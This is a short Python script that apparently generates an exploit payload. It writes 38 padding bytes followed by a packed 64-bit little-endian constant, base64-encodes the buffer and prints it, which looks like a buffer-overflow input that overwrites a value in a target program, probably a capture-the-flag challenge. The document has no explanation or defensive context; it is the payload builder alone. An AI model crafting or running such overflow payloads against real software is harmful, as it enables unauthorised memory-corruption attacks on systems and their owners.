
import sys
import struct
import base64

buf = b'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
buf += struct.pack('<Q', 14298054449837229461)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
